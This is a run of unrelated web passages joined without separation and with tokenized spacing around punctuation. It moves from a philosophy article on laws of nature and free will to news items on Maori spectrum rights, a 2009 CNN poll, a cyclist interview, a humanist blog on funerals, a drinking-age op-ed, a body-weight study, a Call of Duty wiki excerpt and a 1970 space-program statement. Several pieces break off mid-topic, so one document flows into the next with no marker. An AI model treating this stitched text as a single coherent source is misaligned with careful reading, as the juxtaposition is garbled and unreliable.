No , it ’s rather that you ask yourself , “ What will I do today ? ” , and in choosing to do some things rather than others , your actions – that is , your choices – make certain propositions ( including some universal statements containing no proper names ) true and other propositions false .
A good example embodying the Regularists ’ view can be found in the proposition , attributed to Sir Thomas Gresham ( 1519 ? - 1579 ) but already known earlier , called – not surprisingly – “ Gresham ’s Law ” :
[ Gresham ’s Law is ] the theory holding that if two kinds of money in circulation have the same denominational value but different intrinsic values , the money with higher intrinsic value will be hoarded and eventually driven out of circulation by the money with lesser intrinsic value .
In effect what this “ law ” states is that ‘ bad money drives out good ’ .
For example , in countries where the governments begin issuing vast amounts of paper money , that money becomes next - to - worthless and people hoard ‘ good ’ money , e.g. gold and silver coins , that is , “ good ” money ceases to circulate .
Why , when paper money becomes virtually worthless , do people hoard gold ?
Because gold retains its economic value – it can be used in emergencies to purchase food , clothing , flight ( if need be ) , medicine , etc. , even when “ bad ” paper money will likely not be able to be so used .
People do not hoard gold under such circumstances because Gresham ’s “ Law ” forces them to do so .
Gresham ’s “ Law ” is purely descriptive ( not prescriptive ) and illustrates well the point Regularists insist upon : namely , that laws of economics are not causal agents – they do not force the world to be some particular way rather than another .
( Notice , too , how this non-nomological “ Law ” works perfectly adequately in explaining persons ’ behavior .
Citing regularities can , and does , explain the way the world is .
One does not need to posit an underlying , inaccessible , nomicity . )
The manner in which we regard Gresham ’s “ Law ” ought , Regularists suggest , to be the way we regard all laws of nature .
The laws of physics and chemistry are no different than the laws of economics .
All laws of nature – of physics , of chemistry , of biology , of economics , of psychology , of sociology , and so forth – are nothing more , nor anything less , than ( a certain subclass of ) true propositions .
Persons who believe that there is a problem reconciling the existence of free will and determinism have turned upside down the relationship between laws of nature on the one side and events and states of affairs on the other .
It is not that laws of nature govern the world .
We are not “ forced ” to choose one action rather than another .
It is quite the other way round : we choose , and the laws of nature accommodate themselves to our choice .
If I choose to wear a brown shirt , then it is true that I do so ; and if instead I were to choose to wear a blue shirt , then it would be true that I wear a blue shirt .
In neither case would my choosing be ‘ forced ’ by the truth of the proposition that describes my action .
And the same semantic principle applies even if the proposition truly describing my choice is a universal proposition rather than a singular one .
To make the claim even more pointedly : it is only because Necessitarianism tacitly adopts an anti-semantic theory of truth that the supposed problem of free will vs. determinism even arises .
Adopt a thoroughgoing Regularist theory and the problem evaporates .
6. Statistical Laws
Many , perhaps most , of workaday scientific laws ( recall the first section above ) are statistical generalizations – e.g. the scientific claims ( explanatory principles ) of psychology , economics , meteorology , ecology , epidemiology , etc .
But can the underlying , the “ real , ” Laws of Nature itself be statistical ?
With occasional reluctance , especially early in the Twentieth Century , physicists came to allow that at least some laws of nature really are statistical , for example , laws such as “ the half - life of radium is 1,600 years ” which is a shorthand way of saying “ in any sample of radium , 50 % of the radium atoms will radioactively decay within a period of 1,600 years ” .
Regularists take the prospect ( indeed the existence ) of statistical laws of nature in stride .
On the Regularists ’ account , statistical laws of nature – whether in areas studied by physicists or by economists or by pharmacologists – pose no intellectual or theoretical challenges whatsoever .
Just as deterministic ( i.e. exceptionless ) laws are descriptions of the world , not prescriptions or disguised prescriptions , so too are statistical laws .
Necessitarians , however , frequently have severe problems in accommodating the notion of statistical laws of nature .
What sort of metaphysical ‘ mechanism ’ could manifest itself in statistical generalities ?
Could there be such a thing as stochastic nomicity ?
Popper grappled with this problem and proposed what he came to call “ the propensity theory of probability ” .
On his view , each radium atom , for example , would have its “ own ” ( ? ) 50 % propensity to decay within the next 1,600 years .
Popper really did see the problem that statistical laws pose for Necessitarianism , but his solution has won few , if any , other subscribers .
To Regularists , such solutions appear as evidence of the unworkability and the dispensability of Necessitarianism .
They are the sure sign of a theory that is very much in trouble .
7 . Is the Order in the Universe a Cosmic Coincidence ?
An important subtext in the dispute between Necessitarians and Regularists concerns the very concepts we need to ‘ make sense ’ of the universe .
For Regularists , the way - the - world - is is the rock bottom of their intellectual reconstruction .
They have reconciled themselves to , and embraced , the ultimately inexplicable contingency of the universe .
But for Necessitarians , the way - the - world - is can not be the rock bottom .
For after all – they will insist – there has to be some reason , some explanation , why the world is as it is and is not some other way .
It ca n’t simply be , for example , that all electrons , the trillions upon trillions of them , just happen to all bear the identical electrical charge as one another – that would be a cosmic coincidence of an unimaginable improbability .
No , this is no coincidence .
The identity of electrical charge comes about because there is a law of nature to the effect that electrons have this charge .
Laws of nature “ drive ” the world .
The laws of physics which , for example , describe the behavior of diffraction gratings ( see Harrison ) were true from time immemorial and it is because of those laws that diffraction gratings , when they came to be engineered in modern times , have the peculiar properties they do .
Regularists will retort that the supposed explanatory advantage of Necessitarianism is illusory .
Physical necessity – nomicity if you will – is as idle and unempirical a notion as was Locke ’s posit of a material substratum .
Locke ’s notion fell into deserved disuse simply because it did no useful work in science .
It was a superfluous notion .
( The case is not unlike modern arguments that minds are convenient fictions , the product of “ folk ” psychology . )
At some point explanations must come to an end .
Regularists place that stopping point at the way - the - world - is .
Necessitarians place it one , inaccessible , step beyond , at the way - the - world - must - be .
The divide between Necessitarians and Regularists remains as deep as any in philosophy .
Neither side has conceived a theory which accommodates all our familiar , and deeply rooted , historically - informed beliefs about the nature of the world .
To adopt either theory is to give up one or more strong beliefs about the nature of the world .
And there simply do not seem to be any other theories in the offing .
While these two theories are clearly logical contraries , they are – for the foreseeable future – also exhaustive of the alternatives .
8. Notes
Throughout this article , the term “ world ” is used to refer to the entire universe , past , present , and future , to whatever is near and whatever is far , and to whatever is known of that universe and what is unknown .
The term is never used here to refer to just the planet Earth .
Clearly , one presupposition of this article is that the world ( i.e. the universe ) is not much of our making .
Given the sheer size of the universe , our human effect on it is infinitesimal .
The world is not mind - constructed .
The world is some one particular way , although it remains a struggle to figure out what that way is .

In detail – The statement “ There is a river of cola ” is an existential affirmative statement ( a classical so - called I - proposition ) .
Its contradictory ( or better , among its contradictories ) is the statement “ No river is constituted of cola ” ( a classical so - called E- proposition ) .
Now , given that “ There is a river of cola ” is , ex hypothesi , timelessly false , then the universal negative proposition , “ No river is constituted of cola ” , is timelessly true .
But since the latter satisfies all five of the necessary conditions specified ( above ) for being a law of nature , it would turn out to be a law of nature .

A Maori delegation has met Maori Affairs Minister Pita Sharples to put the case for Maori to be given preferential rights to radio spectrum released by the Government .
Dr Sharples says Maori are seeking an agreement with the Crown on " some general principles for allocating spectrum whenever blocks are released for use " .
The Economic Development Ministry is considering how best to carve up " digital dividend " radio spectrum estimated to be worth more than $ 100 million that will be freed up by the closure of analogue television between 2013 and 2015 .
The ministry is consulting on whether Maori should be given special rights to some of that spectrum , which is likely to be used to broadcast digital television and support new " 4G " cellphone and wireless broadband networks .
Te Huarahi Tika Trust , part owner of 2degrees , has written to the ministry , arguing that public consultations on the spectrum are not a substitute for " a formal negotiation process with Maori as a treaty partner " .
Dr Sharples says Maori with interests in spectrum came to him to explain their position .
The delegation represented the Maori Council , Nga Kaiwhakapumau , Te Huarahi Tika Trust and Maori broadcasters .
Dr Sharples says he has been happy to engage in negotiations to protect Maori interests in spectrum .
" The digital dividend creates new opportunities for developments in Maori broadcasting , and technological advances are unlocking new ways to use higher frequencies .
" The Waitangi Tribunal , the courts and successive governments accepted Maori claims to broadcasting frequencies .
However , Maori claims to higher frequencies remain unresolved . "
Opposition broadcasting spokesman Brendon Burns was concerned the Government might have engaged in horse - trading over Maori Party support for the emissions trading scheme .
Dr Sharples dismissed that .
" None of these discussions on spectrum are related in any way to the ETS , " he said .
Sources suggested the delegation 's case had been helped by Te Huarahi Tika Trust making a " silk purse from the sow's ear " of a block of 3G spectrum controversially allocated to Maori at a 5 per cent discount to its market price in 2000 .
The Waitangi Tribunal had earlier ruled spectrum was taonga .
The incoming Labour government decided against specifically reserving spectrum for Maori , but offered the discount and a $ 5 m grant .
Te Huarahi Tika Trust subsidiary Hautaki Trust exchanged the spectrum with African telco Econet for a stake in what is now New Zealand 's third mobile network operator , 2degrees .
Hautaki
Trust was the appropriate body to hold telecommunications frequencies that should be issued free - of - charge for the benefit of all Maori , Te Huarahi Tika Trust said .
The trust said it had used the spectrum allocated in 2000 to attract over $ 250 m of foreign investment , create 250 permanent jobs at 2degrees and force Vodafone and Telecom to invest $ 1b into their networks .
" Maori are long - term investors , investing for the benefit of all New Zealanders , and we pride ourselves on the outcomes achieved for all , " trustee Antony Royal said .
Telecommunications companies are sparring with broadcasters including Sky Television over how much of the digital dividend spectrum should be allocated to their respective industries .

Washington ( CNN ) --
Eleven months before crucial midterm elections , a national poll indicates that the public is divided over whether the country would be better off with Democrats or Republicans controlling Congress .
According to a CNN / Opinion Research Corp. survey released Thursday , 40 percent of people questioned say the U.S. would be better off if Democrats ran Congress while 39 percent feel things would be better if Republicans took charge on Capitol Hill .
The 1 - point margin is a statistical tie .
Support for Democrats is down from a 10 - point advantage in August and a 25 - point margin in January .
" As the debate over health care continues , the Democrats may have lost the competitive advantage that they enjoyed earlier this year , " CNN Polling Director Keating Holland said .
" Since August , the number who support Democratic control of Congress has fallen farthest in the Northeast and the Pacific Rim -- two regions that have been Democratic strongholds for many years . "
Nineteen percent of people questioned say that the country would be in the same condition regardless of which party controls Congress .
Full poll results ( PDF )
All 435 seats in the House and more than a third in the Senate are up for grabs in November 2010 .
Democrats will be defending their 258- 177 margin in the House and 20 - seat advantage in the Senate .
The poll also indicates Americans are split on which party they trust more to handle major changes to the country 's health care system .
Forty - three percent say they trust congressional Democrats more on health care reform , with four in 10 feeling Republicans would do a better job .
The 3 - point margin for Democrats is within the survey 's sampling error .
According to the poll , a very large majority of Americans think that the health care bill that the U.S. Senate is considering would raise the federal deficit and raise their taxes , and while they think that the bill would help many families , only one in five think they would benefit personally if the bill becomes law .
" As a result , more than six in 10 say they oppose the Senate health care bill , " Holland said .
" Republicans obviously do n't like the bill , but two - thirds of independents also say they are against it . "
One of the main sticking points , a public option administered by the federal government that would compete with private insurers , wins support from 53 percent of the public .
The poll was conducted December 2 - 3 , before Tuesday night 's announcement of a deal negotiated by Senate Democrats that would drop the controversial government - run public insurance option for a package of health care alternatives .
The poll surveyed 1,041 adult Americans by telephone .
The poll 's overall sampling error is plus or minus 3 percentage points .

Bradley Wiggins is already talking a good fight in the build up to next year ’s Tour de France and despite speculation surrounding his future remains focussed on improving on his fourth place from 2009 .
The Olympic champion spoke at the recent track meeting in Manchester – Revolution 26 – and believes that he has the ability to beat Lance Armstrong , the rider who stood between him and the podium in Paris this July .
Wiggins had taken a three week period off the bike after racing his most gruelling yet most successful season on the road .
In previous years , with his focus lying on the track , a sixty day road programme was par but in 2009 Wiggins raced from the Tour of Qatar in February , before competing in the Classics , Giro d’Italia , Tour , Worlds and Sun Tour in September .
“ I raced ’till very late in the season with the Sun Tour after the World Championships .
To be honest it was perfect really as it extended my season and meant less time pissing around as I only had a small concentrated break , but still got everything out of my system that I needed to , ” Wiggins told journalists in Manchester .
“ It was my definitely my longest season and I did roughly a hundred days of racing , ” he added .
Wiggins , who admitted to gaining a small amount of weight in the off season still looked in good condition after enjoying all the benefits that come with spending time off the bike .
“ I ’ve put on a bit of weight , lager does that to you but I ’m not really thinking about diet , ” he said .
Wiggins has already earmarked the racing schedule he ’ll compete in before lining up as one of the favourites in Rotterdam on July 3 .
Unlike rivals like Armstrong , the Schlecks and Levi Leipheimer , he ’ll opt for his traditional programme of the Classics and the Giro as preparation , instead of racing in the new , revamped Tour of California in May .
“ I ’m going to be a bit overweight at the Giro and that limits what you can do but it ’s just training there , ” Wiggins said .
“ I ’ll start my season in February and then do most of the early season Spanish races Tour of Murcia , Catalunya , and then couple of the Ardennes .
From there I ’ll go to the Giro and then the Tour de France .
Essentially it will be pretty similar to 2009 .
“ I never really like going to the US , ” he added .
“ I find the trips quite long and the Giro is always far more relaxed and I ’ve got the confidence to ride it quite controlled - race the first 10 days hard and then work for the team or go in the grupetto .
It worked really well for me in 2009 . ”
As for the Tour itself , Wiggins has already sized up a few stages but believes that despite the mountainous profile and critics willing to write him off as early as the route unveiling in October , he can improve and beat Armstrong .
“ I ’ve looked at some of the Tour stages .
A lot of people think it wo n’t be a great Tour for me but that first week if anything is advantageous to me , ” he said .
“ Those cobbled stages could have big gaps to the guys like Andy , Contador , and the guy from America .
“ I had one bad day at the Tour this year and that happened to be when it was the day with the most mountains in it and everyone thought it was a weakness of mine but on some of the other stages I was really comfortable on the climbs , ” added Wiggins .
“ It will make for an interesting race and I still think I ’m a better rider than Lance and a few of the other guys . ”
If Wiggins is to challenge the number one favourite , Alberto Contador , then he ’ll need to make a similar improvement to the one he made in 2009 , when he wowed the cycling world .
“ When it really comes down to it Contador is in a league of his own , so is Andy too but after that there are four or five guys and there is n’t that much between them , ” said Wiggins .
Church of England minister Ed Tomlinson has made the news in recent days — see the Times and Mail websites for examples , and a pro-religious perspective — with an entry on his church ’s blog lamenting the increasing secularisation of funerals , and his own conflicted emotions of conducting an event at which he feels unwanted , or where he feels his beliefs are undervalued .
Here ’s is an example :
I have stood at the crem like a lemon , wondering why on earth I am present at the funeral of somebody led in by the tunes of Tina Turner , summed up in pithy platitudes of sentimental and secular poets and sent into the furnace with “ I Did It My Way ” blaring out across the speakers !
To be brutally honest I can think of a hundred better ways of spending my time as a priest on God ’s earth .
What is the point of my being present if spiritually unwanted ?
Aside from it being an inappropriately personal rant on a church website , he seems unaware that such events are not about him .
The Problem
In his zeal for ensuring that his religion has more involvement in the lives of the people in his community , he appears to have forgotten that a funeral is about the dead person and their family and friends .
Not him .
Not his god .
It ’s to pay respects to the departed , to honour their life , and to give their family and friends a point of closure , something to remember them by .
Period .
That we have , throughout time , as a species attributed certain things to invisible and unprovable forces is neither here nor there .
To my knowledge ( I ’m not an anthropologist ) , mankind has always marked the death of one of its own with respect .
Before Christianity , Judaism , Zoroastrianism , or any of the religious rites , forms and doctrines we remember today ( to say nothing of those lost to Prehistory — the 190,000 + years of modern Homo sapiens history pre-dating modern religions ) .
“ People of the cloth ” were n’t a necessity then for the same reason they are n’t now , however any humanist will recognise the part of mankind that benefits from certain customs , habits and rituals .
Having a wise or respected person ( or elder ) officiate at the departure ceremony of a member of the tribe maintains a sense of belonging , continuation and comfort .
But you do n’t need a degree in theology , a seminary certificate , or a special book for it .
You just need compassion , understanding and respect .
I ’m afraid the blog post about which I ’m writing shows an absence of all of these qualities , instead replacing them with lesser qualities that will likely have hurt and offended people who have recently lost loved ones .
I wonder how the families of his recent funeral ceremonies feel at his slap in their faces ?
That we may have an opinion is not necessarily a justification for publishing it .
To make things worse , it appears that there have been some negative reactions to criticism of ( Father ?
Vicar ?
Reverend ?
Minister ?

Mr Tomlinson ’s blog entry .
Margaret , a humanist celebrant and the person behind Dead Interesting , posted a reply entitled They ’re not doing it his way , to which some of his defenders have responded angrily .
That will be their self - avowed cheek - turning at work , then — or is it the eye removal ?
It depends on whether you think that those who do n’t share your beliefs deserve to be treated like human beings , I suppose .
The Solution
Part of the problem that Mr Tomlinson has unwittingly illustrated is that there is not widespread understanding that those who wish to have a non-religious funerals can easily achieve just that .
He states the following :
I am equally troubled that pastoral care is being left in the hands of those whose main aim is to make money .
And I am further concerned that an opportunity for evangelism is slipping through our fingers .
Atheists and secularists might delight in this fact but is it really the victory they imagine ?
The implication here is that non-religious alternatives are about making money ( we ’ll ignore the collection plates , donation envelopes , tithing sermons , Direct Debit facilities and Gift Aid awareness present at church services ) , when in fact there are humanist celebrants and others who often have a normal career but spend their spare time performing weddings , namings , funerals , memorials and other events that provide a non-religious alternative to those offered by religious organisations .
I understand that there are also people doing this full - time , though I still fail to understand why their costs should be ignored — or does a person of the cloth still have to beg for food , shelter and Internet connectivity ?
The majority of non-religious people ( even those that may have only gone to a church as a child ) that I ’ve spoken to have said that they have or expect to get married in a church , have or expect to name their child in a church and , if they happen to have thought that far ahead , expect to have their funeral service in a church .
But this does not have to be the case .
There are alternatives and they are not — as many people may suspect — antagonistic , iconoclastic alternatives .
They are the marking of important events in our lives without the constant reference to an invisible force , or subject to the dogma and doctrine of that invisible force .
Let me repeat : you can get married , name your child , and farewell a loved one outside of a religious environment .
And the sky will not fall .
It wo n’t be performed in a cleaner ’s closet or seedy back room somewhere , and in many cases it can even take place in a religious building , if that is your wish .
To any pro-religious detractors who may read this and scoff — please recognise that this is the humanistic recognition of the importance of milestones in our lives .
It pre-dates all religion .

Editor 's note : John M. McCardell Jr. , president emeritus at Middlebury College , is founder and president of Choose Responsibility , a nonprofit organization that seeks to engage the public in debate over the effects of the 21 - year - old drinking age .
John McCardell says the 21 - year - old drinking age is n't preventing widespread binge drinking .
( CNN ) --
One year ago , a group of college and university presidents and chancellors , eventually totaling 135 , issued a statement that garnered national attention .
The " Amethyst Initiative " put a debate proposition before the public -- " Resolved : That the 21 - year - old drinking age is not working . "
It offered , in much the way a grand jury performs its duties , sufficient evidence for putting the proposition to the test .
It invited informed and dispassionate public debate and committed the signatory institutions to encouraging that debate .
And it called on elected officials not to continue assuming that , after 25 years , the status quo could not be challenged , even improved .
One year later , the drinking age debate continues , and new research reinforces the presidential impulse .
Just this summer a study published in the Journal of the American Academy of Child and Adolescent Psychiatry revealed that , among college - age males , binge drinking is unchanged from its levels of 1979 ; that among non-college women it has increased by 20 percent ; and that among college women it has increased by 40 percent .
Remarkably , the counterintuitive conclusion drawn by the investigators , and accepted uncritically by the media , including editorials in The New York Times and The Washington Post is that the study proves that raising the drinking age to 21 has been a success .
More recently , a study of binge drinking published in the Journal of the American Medical Association announced that " despite efforts at prevention , the prevalence of binge drinking among college students is continuing to rise , and so are the harms associated with it . "
Worse still , a related study has shown that habits formed at 18 die hard : " For each year studied , a greater percentage of 21 - to 24 - year - olds [ those who were of course once 18 , 19 and 20 ] engaged in binge drinking and driving under the influence of alcohol . "
Yet , in the face of mounting evidence that those young adults age 18 to 20 toward whom the drinking age law has been directed are routinely -- indeed in life - and health - threatening ways -- violating it , there remains a belief in the land that a minimum drinking age of 21 has been a " success . "
And elected officials are periodically reminded of a provision in the 1984 law that continues to stifle any serious public debate in our country 's state legislative chambers :
Any state that sets its drinking age lower than 21 forfeits 10 percent of its annual federal highway appropriation .
But it 's not 1984 anymore .
This statement may seem obvious , but not necessarily .
In 1984 Congress passed and the president signed the National Minimum Drinking Age Act .
The Act , which raised the drinking age to 21 under threat of highway fund withholding , sought to address the problem of drunken driving fatalities .
And indeed , that problem was serious .
States that lowered their ages during the 1970s and did nothing else to prepare young adults to make responsible decisions about alcohol witnessed an alarming increase in alcohol - related traffic fatalities .
It was as though the driving age were lowered but no drivers education were provided .
The results were predictable .
Now , 25 years later , we are in a much different , and better , place .
Thanks to the effective public advocacy of organizations like Mothers Against Drunk Driving , we are far more aware of the risks of drinking and driving .
Automobiles are much safer .
Seatbelts and airbags are mandatory .
The " designated driver " is now a part of our vocabulary .
And more and more states are mandating ignition interlocks for first - time DUI offenders , perhaps the most effective way to get drunken drivers off the road .
And the statistics are encouraging .
Alcohol - related fatalities have declined over the last 25 years .
Better still , they have declined in all age groups , though the greatest number of deaths occurs at age 21 , followed by 22 and 23 .
We are well on the way to solving a problem that vexed us 25 years ago .
The problem today is different .
The problem today is reckless , goal - oriented alcohol consumption that all too often takes place in clandestine locations , where enforcement has proven frustratingly difficult .
Alcohol consumption among young adults is not taking place in public places or public view or in the presence of other adults who might help model responsible behavior .
But we know it is taking place .
If not in public , then where ?
The college presidents who signed the Amethyst Initiative know where .
It happens in " pre-gaming " sessions in locked dorm rooms where students take multiple shots of hard alcohol in rapid succession , before going to a social event where alcohol is not served .
It happens in off - campus apartments beyond college boundaries and thus beyond the presidents ' authority ; and it happens in remote fields to which young adults must drive .
And the Amethyst presidents know the deadly result :
Of the 5,000 lives lost to alcohol each year by those under 21 , more than 60 percent are lost OFF the roadways , according to the National Institute of Alcoholism and Alcohol Abuse .
The principal problem of 2009 is not drunken driving .
The principal problem of 2009 is clandestine binge drinking .
That is why the Amethyst presidents believe a public debate is so urgent .
The law does not say drink responsibly or drink in moderation .
It says do n't drink .
To those affected by it , those who in the eyes of the law are , in every other respect legal adults , it is Prohibition .
And it is incomprehensible .
The principal impediment to public debate is the 10 percent highway penalty .
That penalty should be waived for those states that choose to try something different , which may turn out to be something better .
But merely adjusting the age -- up or down -- is not really the way to make a change .
We should prepare young adults to make responsible decisions about alcohol in the same way we prepare them to operate a motor vehicle : by first educating and then licensing , and permitting them to exercise the full privileges of adulthood so long as they demonstrate their ability to observe the law .
Licensing would work like drivers education -- it would involve a permit , perhaps graduated , allowing the holder the privilege of purchasing , possessing and consuming alcohol , as each state determined , so long as the holder had passed an alcohol education course and observed the alcohol laws of the issuing state .
Most of the rest of the world has come out in a different place on the drinking age .
The United States is one of only four countries -- the others are Indonesia , Mongolia and Palau -- with an age as high as 21 .
All others either have no minimum age or have a lower age , generally 18 , with some at 16 .
Young adults know that .
And , in their heart of hearts , they also know that a law perceived as unjust , a law routinely violated , can over time breed disrespect for law in general .
Slowly but surely we may be seeing a change in attitude .
This summer , Dr. Morris Chafetz , a distinguished psychiatrist , a member of the presidential commission that recommended raising the drinking age , and the founder of the National Institute for Alcoholism and Alcohol Abuse admitted that supporting the higher drinking age is " the most regrettable decision of my entire professional career . "
This remarkable statement did not receive the attention it merited .
Alcohol is a reality in the lives of young adults .
We can either try to change the reality -- which has been our principal focus since 1984 , by imposing Prohibition on young adults 18 to 20 -- or we can create the safest possible environment for the reality .
A drinking age minimum of 21 has not changed the reality .
It 's time to try something different .
It 's not 1984 anymore .
The opinions expressed in this commentary are solely those of John M. McCardell Jr .

Here is some cheering news for young women who are so unhappy with their “ imperfect ” bodies .
Men fall for women with ordinary body and normal weight , rather than catwalk skeletons .
Research team from the University of St Andrews , Scotland , invited a group of students for their study .
84 female students were asked about their health , had their blood pressure measured , and photographed .
Then , a male group , also involved in the study , were shown the photos and asked to assess the female students in terms of attractiveness and health .
Majority of young men preferred female students with normal weight .
In this study , female students with normal healthy weight were rated the highest for attractiveness and health .
This should be considered by young women believing they have to get slimmer to be attractive .
Researchers encourage women to rely on the assessment by men aged between 18 and 26 years who were largely attracted by women with normal weight , rather than skinny role models like Paris Hilton or Nicole Richie .
Complete research appeared in Perception on Wednesday , December 9 .

Playercards ( referred to as Callsigns in some games ) are a feature that appear in Call of Duty : Modern Warfare 2 , Call of Duty : Black Ops , Call of Duty : Modern Warfare 3 , Call of Duty : Black Ops II , Call of Duty : Ghosts , Call of Duty : Advanced Warfare , Call of Duty : Black Ops III , Call of Duty : Infinite Warfare , Call of Duty : Modern Warfare Remastered , Call of Duty : WWII , and Call of Duty : Black Ops 4 , used to distinguish from player to player .
Playercards vary between games on functionality .
Contents show ]
Call of Duty : Modern Warfare 2 Edit
One of the two games to refer to the system as a Callsign , it features the following elements :
The player 's name
A Title - a background with a word or phrase
An Emblem - a small picture
The player 's level
The player 's Clan Tag
Players can choose from 570 Titles and 297 Emblems , to be unlocked by completing challenges , prestiging and ranking up .
The callsign of a relevant player can appear on the user interface several times at particular events during multiplayer gameplay : whenever a player kills or is killed by another player , when a player completes or affects an objective in a match , when a player is being spectated ( including killcams ) , or when the player calls in a killstreak reward of 8 kills or more .
For the emblems that are found in the the game , see Emblems / Call of Duty : Modern Warfare 2 .
For the calling cards that are found in the game , see Calling Cards / Call of Duty : Modern Warfare 2 .
Call of Duty : Black Ops Edit
The first game to refer to it as a Playercard , options available include :
Emblem Editor
Backgrounds
Clan Tags
Challenges
Combat Records
Leaderboards

Emblem Editor Edit
Making its first appearance in Call of Duty : Black Ops , Emblem Editing allows the player to use individual emblem images that can be colored , moved , rotated , flipped , resized and stacked to create a personalized emblem .
There are shapes ranging from geometric shapes to silhouettes of people and animals .
Each playercard can have up to 12 emblem images layered at once .
The emblem images and layers will still have to be unlocked , however .
Each image , regardless of unlock criteria , also costs 100 CoD Points to purchase .
The player will unlock the ability to have their emblem printed onto the weapon of their liking at level 16 .
All the emblems , layers , and backgrounds the player buys stay with them when they prestige .
If one has any CoD points left just before prestiging , it is advisable to buy extra emblems as CoD points will reset after prestiging .
The freedom to design an emblem has caused some controversy due to the designs available , and many offensive , lewd , or otherwise inappropriate emblems have sprung up , ranging from swastikas to likenesses of genitalia and animals fornicating .
Treyarch has stated that they control this with bans , temporary and permanent , from using the Emblem Editor , as well as resetting the emblem , including any layer and design purchases .
Moreover , all players have the ability to flag down emblems they find offensive .

Call of Duty : Modern Warfare 3 Edit
The second game to refer to the system as Callsigns , there player is able to access the same options as Call of Duty : Modern Warfare 2 , however adding a new feature that shows the player 's levels on each Call of Duty game since Call of Duty 4 : Modern Warfare .
However , this feature is only available on consoles .
There are 512 Titles and 350 Emblems to choose from .

In Call of Duty : Black Ops , players can put their clan tag and emblem on their primary weapon for 1000 each .
In Call of Duty : Black Ops II , you can earn the ability to add these to a gun by prestiging the weapon .
Call of Duty : Black Ops Edit
OVER the last decade , the principal goal of our Nation 's space program has been the moon .
By the end of that decade men from our planet had traveled to the moon on four occasions and twice they had walked on its surface .
With these unforgettable experiences , we have gained a new perspective of ourselves and our world .
I believe these accomplishments should help us gain a new perspective of our space program as well .
Having completed that long stride into the future which has been our objective for the past decade , we must now define new goals which make sense for the seventies .
We must build on the successes of the past , always reaching out for new achievements .
But we must also recognize that many critical problems here on this planet make high priority demands on our attention and our resources .
By no means should we allow our space program to stagnate .
But -- with the entire future and the entire universe before us - we should not try to do everything at once .
Our approach to space must continue to be bold -- but it must also be balanced .
When this administration came into office , there were no clear , comprehensive plans for our space program after the first Apollo landing .
To help remedy this situation , I established in February of 1969 a space task group , headed by the Vice President , to study possibilities for the future of that program .
Their report was presented to me in September .
After reviewing that report and considering our national priorities , I have reached a number of conclusions concerning the future pace and direction of the Nation 's space efforts .
The budget recommendations which I have sent to the Congress for fiscal year 1971 are based on these conclusions .
THREE GENERAL PURPOSES
In my judgment , three general purpose should guide our space program .
One purpose is exploration .
From time immemorial , man has insisted on venturing into the unknown despite his inability to predict precisely the value of any given exploration .
He has been willing to take risks , willing to be surprised , willing to adapt to new experiences .
Man has come .
to feel that such quests are worthwhile in and of themselves -- for they represent one way in which he expands his vision and expresses the human spirit .
A great nation must always be an exploring nation if it wishes to remain great .
A second purpose of our space program is scientific knowledge - - a greater systematic understanding about ourselves and our universe .
With each of our space ventures , man 's total information about nature has been dramatically expanded ; the human race was able to learn more about the Moon and Mars in a few hours last summer than had been learned in all the centuries that had gone before .
The people who perform this important work are not only those who walk in space suits while millions watch or those who launch powerful rockets in a burst of flame .
Much of our scientific progress comes in laboratories and offices , where dedicated , inquiring men and women decipher new facts and add them to old ones in ways which reveal new truths .
The abilities of these scientists constitute one of our most valuable national resources .
I believe that our space program should help these people in their work and should be attentive to their suggestions .
A third purpose of the United States space effort is that of practical application - turning the lessons we learn in space to the early benefit of life on earth .
Examples of such lessons are manifold ; they range from new medical insights to new methods of communication , from better weather forecasts to new management techniques and new ways of providing energy .
But these lessons will not apply themselves ; we must make a concerted effort to see that the results of our space research are used to the maximum advantage of the human community .
A CONTINUING PROCESS
We must see our space effort , then , not only as an adventure of today but also as an investment in tomorrow .
We did not go to the moon merely for the sport of it .
To be sure , those undertakings have provided an exciting adventure for all mankind and we are proud that it was our Nation that met this challenge .
But the most important thing about man 's first footsteps on the moon is what they promise for the future .
We must realize that space activities will be a part of our lives for the rest of time .
We must think of them as part of a continuing process -- one which will go on day in and day out , year in and year out - and not as a series of separate leaps , each requiring a massive concentration of energy and will and accomplished on a crash timetable .
Our space program should not be planned in a rigid manner , decade by decade , but on a continuing flexible basis , one which takes into account our changing needs and our expanding knowledge .
We must also realize that space expenditures must take their proper place within a rigorous system of national priorities .
What we do in space from here on in must become a normal and regular part of our national life and must therefore be planned in conjunction with all of the other undertakings which are also important to us .
The space budget which I have sent to Congress for fiscal year 1971 is lower than the budget for fiscal year 1970 , a condition which reflects the fiscal constraints under which we presently operate and the competing demands of other programs .
I am confident , however , that the funding I have proposed will allow our space program to make steady and impressive progress .
SIX SPECIFIC OBJECTIVES
With these general considerations in mind , I have concluded that our space program should work toward the following specific objectives :
1 . We should continue to explore the moon .
Future Apollo manned lunar landings will be spaced so as to maximize our scientific return from each mission , always providing , of course , for the safety of those who undertake these ventures .
Our decisions about manned and unmanned lunar voyages beyond the Apollo program will he based on the results of these missions .
2 . We should move ahead with bold exploration of the planets and the universe .
In the next few years , scientific satellites of many types will be launched into earth orbit to bring us new information about the universe , the solar system , and even our own planet .
During the next decade , we will also launch unmanned spacecraft to all the planets of our solar system , including an unmanned vehicle which will be sent to land on Mars and to investigate its surface .
In the late 1970's , the " Grand Tour " missions will study the mysterious outer planets of the solar system - Jupiter , Saturn , Uranus , Neptune , and Pluto .
The positions of the planets at that time will give us a unique opportunity to launch missions which can visit several of them on a single flight of over 3 billion miles .
Preparations for this program will begin in 1972 .
There is one major but longer - range goal we should keep in mind as we proceed with our exploration of the planets .
As a part of this program we will eventually send men to explore the planet Mars .
3 . We should work to reduce substantially the cost of space operations .
Our present rocket technology will provide a reliable launch capability for some time .
But as we build for the longer - range future , we must devise less costly and less complicated ways of transporting payloads into space .
Such a capability - designed so that it will be suitable for a wide range of scientific , defense , and commercial uses -- can help us realize important economies in all aspects of our space program .
We are currently examining in greater detail the feasibility of reusable space shuttles as one way of achieving this objective .
4 . We should seek to extend man 's capability to live and work in space .
The Experimental Space Station ( XSS ) -- a large orbiting workshop - - will be an important part of this effort .
We are now building such a station -- using systems originally developed for the Apollo program -- and plan to begin using it for operational missions in the next few years .
We expect that men will be working in space for months at a time during the coming decade .
We have much to learn about what man can and cannot do in space .
On the basis of our experience with the XSS , we will decide when and how to develop longer lived space stations .
Flexible , long - lived space station modules could provide a multipurpose space platform for the longer - range future and ultimately become a building block for manned interplanetary travel .
5 . We should hasten and expand the practical applications of space technology .
The development of earth resources satellites - platforms which can help in such varied tasks as surveying crops , locating mineral deposits , and measuring water resources -- will enable us to assess our environment and use our resources more effectively .
